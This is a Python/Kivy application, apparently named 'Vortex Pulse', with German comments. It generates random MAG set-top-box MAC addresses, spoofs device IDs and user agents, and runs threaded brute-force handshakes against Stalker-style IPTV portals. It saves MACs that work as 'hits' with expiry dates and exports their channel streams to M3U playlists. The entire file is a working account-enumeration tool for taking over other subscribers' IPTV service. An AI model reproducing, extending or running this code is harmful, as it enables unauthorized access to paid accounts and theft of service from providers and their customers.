# -*- coding: utf-8 -*-
import os
import sys
import time
import random
import re
import threading
import json
import hashlib
import webbrowser
from datetime import datetime
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Kivy-Framework Importe für die Benutzeroberfläche
from kivy.app import App
from kivy.utils import platform
from kivy.clock import Clock
from kivy.uix.slider import Slider
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.scrollview import ScrollView
from kivy.uix.textinput import TextInput
from kivy.graphics import Color, Rectangle
from kivy.animation import Animation
from concurrent.futures import ThreadPoolExecutor

# =============================================================================
# PFAD- & RECHTE-VERWALTUNG
# =============================================================================

if platform == 'android':
    from jnius import autoclass
    def check_all_files_permission():
        """Fordert unter Android Zugriff auf alle Dateien an (Scoped Storage Bypass)."""
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        Environment = autoclass('android.os.Environment')
        if not Environment.isExternalStorageManager():
            try:
                Intent = autoclass('android.content.Intent')
                Settings = autoclass('android.provider.Settings')
                Uri = autoclass('android.net.Uri')
                intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                uri = Uri.parse(f"package:{PythonActivity.mActivity.getPackageName()}")
                intent.setData(uri)
                PythonActivity.mActivity.startActivity(intent)
            except: pass

    check_all_files_permission()
    BASE = "/storage/emulated/0/Download/Vortex_Pulse"
else:
    # Pfad für Windows/Linux/macOS
    BASE = os.path.dirname(os.path.abspath(sys.argv[0]))

# Ordnerstruktur definieren
PATHS = {
    "panel_dir": os.path.join(BASE, "eingabe", "panel"),
    "combo_dir": os.path.join(BASE, "eingabe", "combo"),
    "hits_dir":  os.path.join(BASE, "Hits"),
    "proxy_dir": os.path.join(BASE, "eingabe", "proxy")
}

# Verzeichnisse automatisch erstellen
for folder in PATHS.values():
    os.makedirs(folder, exist_ok=True)


# =============================================================================
# GLOBALE VARIABLEN & MULTI-THREADING STEUERUNG
# =============================================================================
premium_mode = False  # Steuert, welche Logik verwendet wird
stop_signal = threading.Event()    # Beendet alle Threads
pause_event = threading.Event()    # Steuert die Pause-Funktion
pause_event.set()                  # Initial auf "Laufen" gestellt

hit_lock = threading.Lock()        # Verhindert Schreibfehler bei Hits
logged_hits = set()                # Speichert bereits gefundene MACs pro Session
stats = {
    "checked": 0, 
    "hits": 0, 
    "total": 0, 
    "is_running": False
}
current_threads = 3                # Standard Thread-Anzahl


# =============================================================================
# MAC-GENERATOR & DATEI-LOGIK
# =============================================================================

def get_existing_macs():
    """Scannt alle vorhandenen Combo-Dateien, um Duplikate beim Generieren zu vermeiden."""
    existing = set()
    if not os.path.exists(PATHS["combo_dir"]):
        return existing
    for file in os.listdir(PATHS["combo_dir"]):
        if file.endswith(".txt"):
            with open(os.path.join(PATHS["combo_dir"], file), 'r', errors='ignore') as f:
                for line in f:
                    mac = line.strip().upper()
                    if mac: existing.add(mac)
    return existing

def generate_random_macs(count):
    """Erzeugt neue, zufällige MAC-Adressen mit dem 00:1A:79 Präfix."""
    existing_macs = get_existing_macs()
    new_macs = set()
    attempts = 0
    max_attempts = count * 2 
    
    while len(new_macs) < count and attempts < max_attempts:
        suffix = ":".join(["{:02x}".format(random.randint(0, 255)) for _ in range(3)])
        mac = f"00:1A:79:{suffix.upper()}"
        if mac not in existing_macs and mac not in new_macs:
            new_macs.add(mac)
        attempts += 1
    
    # Automatische Dateibenennung (combo_1.txt, combo_2.txt, ...)
    i = 1
    while True:
        file_name = f"combo_{i}.txt"
        full_path = os.path.join(PATHS["combo_dir"], file_name)
        if not os.path.exists(full_path): break
        i += 1
    
    with open(full_path, "w") as f:
        for m in new_macs: f.write(f"{m}\n")
            
    return len(new_macs), file_name


# =============================================================================
# NETZWERK- & AUTHENTIFIZIERUNGS-LOGIK
# =============================================================================

def get_auth_elements(mac):
    """Generiert gerätespezifische IDs basierend auf der MAC-Adresse."""
    mac_clean = mac.strip().upper()
    serial = hashlib.md5(mac_clean.encode()).hexdigest().upper()
    sn = serial[:13]
    device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
    device_id2 = hashlib.sha256(mac_clean.encode()).hexdigest().upper()
    return sn, device_id, device_id2

def build_headers(panel_url, mac_enc, token=None, auth_data=None):
    if not premium_mode:
        # LOGIK AUS SCRIPT 2 (Für Gold-Portale wie sbhgoldpro)
        user_agents = [
            {"ua": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 612 Safari/533.3", "xua": "Model: MAG322; SW: 2.20-r19-pub-322"},
            {"ua": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 5 rev: 540 Safari/533.3", "xua": "Model: MAG540; SW: 5.1.0-r1-pub-540"}
        ]
        choice = random.choice(user_agents)
        ref = f"{panel_url.rstrip('/')}/c/"
        headers = {
            "User-Agent": choice["ua"], 
            "Referer": ref, 
            "X-User-Agent": choice["xua"],
            "Accept": "*/*"
        }
    else:
        # LOGIK AUS SCRIPT 1 (Standard-Modus)
        ua = "Mozilla/5.0 (MAG200 stbapp)"
        ref = panel_url if "/c/" in panel_url else f"{panel_url.rstrip('/')}/c/"
        headers = {"User-Agent": ua, "Referer": ref, "Accept": "*/*"}

    cookie_str = f"mac={mac_enc}; stb_lang=en; timezone=Europe/Berlin;"
    if auth_data:
        sn, d1, d2 = auth_data
        cookie_str += f" sn={sn}; device_id={d1}; device_id2={d2};"
    
    headers["Cookie"] = cookie_str
    if token: headers["Authorization"] = f"Bearer {token}"
    return headers

def get_account_expiry(session, panel_url, mac, token, auth_data, filters=None):
    """Prüft Account-Status, Ablaufdatum und Kanäle."""
    VALID_MONTHS = ["JANUARY", "FEBRUARY", "MARCH", "APRIL", "MAY", "JUNE", 
                    "JULY", "AUGUST", "SEPTEMBER", "OCTOBER", "NOVEMBER", "DECEMBER"]
    
    COUNTRY_MAP = {
        "DE": ["DE", "GER", "GERMANY", "DEUTSCHLAND", "DACH"],
        "TR": ["TR", "TURKEY", "TURK", "TURKIYE", "TÜRK"],
        "EU": ["EU", "EUROPE", "ITALY", "SPAIN", "FRANCE", "GREECE", "NL", "BE"],
        "UK": ["UK", "UNITED KINGDOM", "ENGLAND", "SKY UK"],
        "US": ["US", "USA", "AMERICA"]
    }

    try:
        mac_enc = mac.replace(":", "%3A")
        headers = build_headers(panel_url, mac_enc, token, auth_data)
        
        # Account Infos & Bouquets abrufen
        r_info = session.get(f"{panel_url}/portal.php?type=account_info&action=get_main_info", headers=headers, timeout=12)
        data_main = r_info.json() if r_info.status_code == 200 else {}
        
        r_list = session.get(f"{panel_url}/portal.php?type=itv&action=get_ordered_list", headers=headers, timeout=12)
        data_bouquets = r_list.json() if r_list.status_code == 200 else {}

        search_blob = (json.dumps(data_main) + json.dumps(data_bouquets)).upper()
        has_channels = len(data_bouquets.get("js", {}).get("data", [])) > 0 or len(data_bouquets.get("data", [])) > 0
        
        # Ablaufdatum suchen
        expiry_found = None
        for val in re.findall(r"['\"](.*?)['\"]", str(data_main)):
            if any(m in val.upper() for m in VALID_MONTHS):
                expiry_found = val
                break
        
        # Validierung: Entweder Datum gefunden ODER Kanäle vorhanden
        if not expiry_found and not has_channels: return None
        final_expiry = expiry_found if expiry_found else "Active (No Date)"

        # Länderfilter anwenden
        if filters:
            all_allowed_terms = []
            for f in filters:
                f_clean = f.upper().strip()
                if not f_clean: continue
                all_allowed_terms.append(f_clean)
                if f_clean in COUNTRY_MAP: all_allowed_terms.extend(COUNTRY_MAP[f_clean])
            if not any(term in search_blob for term in all_allowed_terms): return None 

        return final_expiry
    except: return None

def scan_single_job(panel_url, mac, filters=None, log_callback=None):
    if stop_signal.is_set(): return
    base_url = panel_url.strip().rstrip('/')
    session = requests.Session()
    session.verify = False 
    
    try:
        auth_data = get_auth_elements(mac)
        mac_enc = mac.replace(":", "%3A")
        urls_to_try = [base_url]
        if "/c" not in base_url.lower(): urls_to_try.append(f"{base_url}/c")

        token = None
        final_used_url = base_url

        for try_url in urls_to_try:
            # Umschalten des Handshake-Strings
            if premium_mode:
                hs_url = f"{try_url}/portal.php?type=stb&action=handshake&token=&mac={mac_enc}"
            else:
                # Script 2 nutzt KEIN '&token=' im Handshake
                hs_url = f"{try_url}/portal.php?type=stb&action=handshake&mac={mac_enc}"
            
            r = session.get(hs_url, headers=build_headers(try_url, mac_enc, auth_data=auth_data), timeout=12)
            if r.status_code == 200:
                data = r.json()
                token = data.get("js", {}).get("token") or data.get("token")
                if token:
                    final_used_url = try_url
                    break

        if token:
            expiry = get_account_expiry(session, final_used_url, mac, token, auth_data, filters)
            if expiry:
                # ... (Rest der Speicherlogik bleibt gleich wie in Script 1)
                with hit_lock:
                    key = f"{final_used_url}|{mac}"
                    if key not in logged_hits:
                        logged_hits.add(key)
                        stats["hits"] += 1
                        clean_name = re.sub(r'[:\.]', '_', final_used_url.split("//")[-1].split("/")[0])
                        file_path = os.path.join(PATHS["hits_dir"], f"{clean_name}.txt")
                        with open(file_path, "a", encoding="utf-8") as f:
                            if os.path.getsize(file_path) == 0: f.write(f"Server: {final_used_url}\n")
                            f.write(f"{mac} | Expiry: {expiry}\n")
                        if log_callback: log_callback(f"[HIT] {mac} -> {expiry}")
    except: pass
    finally:
        with hit_lock: stats["checked"] += 1
        session.close()

# =============================================================================
# M3U EXPORT LOGIK (INTEGRIERT)
# =============================================================================

def fetch_m3u_data(panel_url, mac, log_callback):
    """Holt Kanäle und erstellt Stream-Links parallel."""
    session = requests.Session()
    session.verify = False
    mac_enc = mac.replace(":", "%3A")
    auth_data = get_auth_elements(mac)
    base_url = panel_url.strip().rstrip('/')
    
    try:
        log_callback(f"[M3U] Handshake: {mac}")
        # Handshake je nach Modus
        if premium_mode:
            hs_url = f"{base_url}/portal.php?type=stb&action=handshake&token=&mac={mac_enc}"
        else:
            hs_url = f"{base_url}/portal.php?type=stb&action=handshake&mac={mac_enc}"
            
        r = session.get(hs_url, headers=build_headers(base_url, mac_enc, auth_data=auth_data), timeout=10)
        token = r.json().get("js", {}).get("token") or r.json().get("token")
        
        if not token: return "Kein Token erhalten."

        log_callback("[M3U] Lade Kanalliste...")
        c_url = f"{base_url}/portal.php?type=itv&action=get_all_channels&mac={mac_enc}&token={token}"
        c_res = session.get(c_url, headers=build_headers(base_url, mac_enc, token, auth_data), timeout=10).json()
        
        chans = c_res.get("js", {}).get("data") or c_res.get("js", {}).get("channels") or c_res.get("js", {}).get("items") or []
        if not chans: return "Keine Kanäle gefunden."

        log_callback(f"[M3U] Extrahiere Links für {len(chans)} Sender...")
        m3u_content = "#EXTM3U\n"
        
        def get_link(ch):
            cmd = ch.get("cmd", "")
            if not cmd: return None
            l_url = f"{base_url}/portal.php?type=itv&action=create_link&mac={mac_enc}&token={token}&cmd={requests.utils.quote(cmd)}"
            try:
                l_res = session.get(l_url, headers=build_headers(base_url, mac_enc, token, auth_data), timeout=7).json()
                link = l_res.get("js", {}).get("cmd") or l_res.get("js") or ""
                link = re.sub(r'^(ffmpeg|auto|ffrt|rfat)\s+', '', str(link)).strip()
                if link.startswith("http"):
                    return f"#EXTINF:-1,{ch.get('name')}\n{link}"
                return None
            except: return None

        # Nutzt ThreadPool für Speed (8 Threads)
        with ThreadPoolExecutor(max_workers=8) as executor:
            results = list(executor.map(get_link, chans))
            for res in results:
                if res: m3u_content += res + "\n"

        filename = f"M3U_{mac.replace(':', '')}.m3u"
        save_path = os.path.join(PATHS["hits_dir"], filename)
        with open(save_path, "w", encoding="utf-8") as f:
            f.write(m3u_content)
            
        return f"Erfolg! Gespeichert in Hits/{filename}"
    except Exception as e:
        return f"Fehler: {str(e)}"


# =============================================================================
# KIVY BENUTZEROBERFLÄCHE (UI)
# =============================================================================

class VortexApp(App):    
    def build(self):
        # Hauptlayout & Hintergrund-Animation
        self.root_layout = BoxLayout(orientation='vertical', padding=15, spacing=15)
        with self.root_layout.canvas.before:
            self.bg_color = Color(0, 0, 0, 1)
            self.rect = Rectangle(size=(10000, 10000), pos=(0,0))
        self.root_layout.bind(size=self._update_rect, pos=self._update_rect)
        
        anim = Animation(rgba=(0.05, 0, 0.15, 1), duration=3) + Animation(rgba=(0, 0, 0, 1), duration=3)
        anim.repeat = True
        anim.start(self.bg_color)

        # UI Komponenten
        self.status_label = Label(text="Vortex Pulse VMOD - Platinum", size_hint_y=None, height=80, font_size='18sp', bold=True)
        self.root_layout.add_widget(self.status_label)

        # Thread-Slider
        speed_box = BoxLayout(orientation='horizontal', size_hint_y=None, height=60)
        self.speed_info = Label(text=f"Threads: {current_threads}", size_hint_x=0.3)
        self.speed_slider = Slider(min=1, max=25, value=current_threads, step=1)
        self.speed_slider.bind(value=self.update_speed)
        speed_box.add_widget(self.speed_info); speed_box.add_widget(self.speed_slider)
        self.root_layout.add_widget(speed_box)

        # Eingabefelder
        self.filter_input = TextInput(hint_text="Länderfilter (z.B. DE, TR, EU)", multiline=False, size_hint_y=None, height=90, background_color=(1,1,1,0.1), foreground_color=(1,1,1,1))
        self.root_layout.add_widget(self.filter_input)

        # MAC-Generator Sektion
        gen_box = BoxLayout(orientation='horizontal', size_hint_y=None, height=90, spacing=10)
        self.gen_count = TextInput(text="1000", multiline=False, input_filter="int", size_hint_x=0.3)
        self.gen_btn = Button(text="MACs GEN", background_color=(0.2, 0.6, 1, 1))
        self.gen_btn.bind(on_press=self.do_generate)
        gen_box.add_widget(self.gen_count); gen_box.add_widget(self.gen_btn)
        self.root_layout.add_widget(gen_box)

        # --- NEU: EINGABEFELDER FÜR MUX ---
        m3u_input_box = BoxLayout(orientation='horizontal', size_hint_y=None, height=90, spacing=10)
        self.m3u_portal = TextInput(hint_text="Portal URL eingeben", multiline=False, background_color=(1,1,1,0.1), foreground_color=(1,1,1,1))
        self.m3u_mac = TextInput(hint_text="MAC Adresse eingeben", multiline=False, background_color=(1,1,1,0.1), foreground_color=(1,1,1,1))
        
        m3u_input_box.add_widget(self.m3u_portal)
        m3u_input_box.add_widget(self.m3u_mac)
        self.root_layout.add_widget(m3u_input_box)
        # ---------------------------------

        # M3U Button (bleibt fast gleich, nur Text angepasst)
        self.m3u_btn = Button(
            text="DIESE MAC ZU M3U WANDELN", 
            size_hint_y=None, 
            height=100, 
            background_color=(0.6, 0.2, 0.8, 1) # Lila
        )
        self.m3u_btn.bind(on_press=self.start_m3u_export)
        self.root_layout.add_widget(self.m3u_btn)


        # Log-Bereich
        self.log_area = TextInput(readonly=True, background_color=(0,0,0,0.5), foreground_color=(0,1,1,1), font_size='13sp')
        scroll = ScrollView(); scroll.add_widget(self.log_area); self.root_layout.add_widget(scroll)

        # Buttons
        self.hits_btn = Button(text="HITS ORDNER ÖFFNEN", size_hint_y=None, height=100, background_color=(0.2, 0.4, 0.8, 1))
        self.hits_btn.bind(on_press=self.open_hits)
        self.root_layout.add_widget(self.hits_btn)

        # Premium/Gold Modus Button
        self.mode_btn = Button(
            text="MODUS: GOLD (Script 2)", 
            size_hint_y=None, 
            height=100, 
            background_color=(1, 0.8, 0, 1) # Goldene Farbe
        )

        btn_layout = BoxLayout(orientation='horizontal', size_hint_y=None, height=120, spacing=10)
        self.mode_btn.bind(on_press=self.toggle_mode)
        self.root_layout.add_widget(self.mode_btn)
      
        self.start_btn = Button(text="START", background_color=(0,0.8,0,1)); self.start_btn.bind(on_press=self.start_logic)
        self.pause_btn = Button(text="PAUSE", disabled=True, background_color=(1, 0.5, 0, 1)); self.pause_btn.bind(on_press=self.toggle_pause)
        self.exit_btn = Button(text="EXIT", background_color=(0.4,0.4,0.4,1)); self.exit_btn.bind(on_press=self.stop_app)
        
        btn_layout.add_widget(self.start_btn); btn_layout.add_widget(self.pause_btn); btn_layout.add_widget(self.exit_btn)
        self.root_layout.add_widget(btn_layout)
        
        Clock.schedule_interval(self.refresh_ui, 0.5)
        return self.root_layout

    # --- UI Helfer-Funktionen ---
    
    def _update_rect(self, instance, value):
        self.rect.pos = instance.pos
        self.rect.size = instance.size

    def open_hits(self, instance):
        if platform == 'android':
            try:
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                Intent = autoclass('android.content.Intent')
                Uri = autoclass('android.net.Uri')
                intent = Intent(Intent.ACTION_VIEW)
                intent.setDataAndType(Uri.parse(PATHS["hits_dir"]), "resource/folder")
                PythonActivity.mActivity.startActivity(intent)
            except: self.update_log("Fehler beim Öffnen des Managers.")
        else: webbrowser.open(PATHS["hits_dir"])

    def update_speed(self, instance, value):
        global current_threads; current_threads = int(value); self.speed_info.text = f"Threads: {current_threads}"

    def do_generate(self, instance):
        count = int(self.gen_count.text) if self.gen_count.text else 0
        self.update_log("Datenbank-Check...")
        num, name = generate_random_macs(count)
        self.update_log(f"-> {num} MACs in {name} gespeichert.")

    def toggle_pause(self, instance):
        if pause_event.is_set():
            pause_event.clear(); self.pause_btn.text = "WEITER"; self.pause_btn.background_color = (0, 0.5, 1, 1)
        else:
            pause_event.set(); self.pause_btn.text = "PAUSE"; self.pause_btn.background_color = (1, 0.5, 0, 1)

    def refresh_ui(self, dt):
        # Wir entfernen die Bedingung "if stats['is_running']", 
        # damit die Anzeige auch nach dem Ende korrekt bleibt.
        rem = max(0, stats['total'] - stats['checked'])
        self.status_label.text = f"Geprüft: {stats['checked']} | Hits: {stats['hits']} | Übrig: {rem}"


    def update_log(self, text):
        def _add(dt): 
            self.log_area.text += f"{text}\n"
            self.log_area.cursor = (0, len(self.log_area.text))
        Clock.schedule_once(_add)

    # --- Scanner Steuerung ---

    def start_logic(self, instance):
        global logged_hits
        logged_hits.clear()
        stop_signal.clear(); pause_event.set()
        stats.update({"checked": 0, "hits": 0, "total": 0, "is_running": True})
        self.log_area.text = ""; self.status_label.text = "Lade Daten..."
        
        def load_unique(dir_path):
            data = set()
            if not os.path.exists(dir_path): return []
            for f in os.listdir(dir_path):
                if f.endswith(".txt"):
                    with open(os.path.join(dir_path, f), 'r', errors='ignore') as file:
                        for line in file:
                            val = line.strip()
                            if val: data.add(val)
            return list(data)

        panels = []
        p_file = os.path.join(PATHS["panel_dir"], "panel.txt")
        if os.path.exists(p_file):
            with open(p_file, 'r') as f:
                panels = [p.strip() if p.startswith("http") else f"http://{p.strip()}" for p in f if p.strip()]

        macs = load_unique(PATHS["combo_dir"])
        if not panels or not macs:
            self.update_log("FEHLER: Keine Panels oder MACs gefunden!"); stats["is_running"] = False
            return

        jobs = [(p, m) for p in panels for m in macs]
        random.shuffle(jobs)
        stats["total"] = len(jobs)
        
        f_text = self.filter_input.text.strip()
        filters = [f.strip() for f in f_text.split(",") if f.strip()] if f_text else None
        
        self.start_btn.disabled = True; self.pause_btn.disabled = False
        threading.Thread(target=self.run_scanner, args=(jobs, filters), daemon=True).start()

    def run_scanner(self, jobs, filters):
        def worker():
            while not stop_signal.is_set():
                pause_event.wait()
                try:
                    with hit_lock:
                        if not jobs: break
                        p, m = jobs.pop()
                    scan_single_job(p, m, filters, self.update_log)
                except: break
        
        threads = [threading.Thread(target=worker, daemon=True) for _ in range(current_threads)]
        for t in threads: t.start()
        for t in threads: t.join()
        Clock.schedule_once(lambda dt: self.finish_scan())

    def finish_scan(self):
        stats["is_running"] = False
        # Setze die Anzeige manuell auf das Maximum, um Rundungsfehler/Timing-Fehler zu vermeiden
        self.status_label.text = f"Geprüft: {stats['total']} | Hits: {stats['hits']} | Übrig: 0"
        
        self.start_btn.disabled = False
        self.pause_btn.disabled = True
        self.pause_btn.text = "PAUSE"
        self.update_log("--- SCAN BEENDET ---")


    def stop_app(self, instance):
        stop_signal.set(); pause_event.set(); App.get_running_app().stop()

    def toggle_mode(self, instance):
        global premium_mode
        if not premium_mode:
            premium_mode = True
            self.mode_btn.text = "MODUS: PREMIUM (Script 1)"
            self.mode_btn.background_color = (0.2, 0.8, 0.2, 1) # Grün
        else:
            premium_mode = False
            self.mode_btn.text = "MODUS: GOLD (Script 2)"
            self.mode_btn.background_color = (1, 0.8, 0, 1) # Gold

    def start_m3u_export(self, instance):
        """Liest Portal und MAC aus den Textfeldern und startet den Export."""
        portal = self.m3u_portal.text.strip()
        mac = self.m3u_mac.text.strip()

        if not portal or not mac:
            self.update_log("FEHLER: Bitte Portal und MAC oben eintippen!")
            return

        # Sicherstellen, dass die URL mit http anfängt
        if not portal.startswith("http"):
            portal = "http://" + portal

        def run():
            self.update_log(f"[M3U] Starte Export für: {mac}")
            # Ruft die fetch_m3u_data Logik auf, die du schon im Script hast
            res = fetch_m3u_data(portal, mac, self.update_log)
            self.update_log(f"STATUS: {res}")

        threading.Thread(target=run, daemon=True).start()

if __name__ == "__main__":
    VortexApp().run()
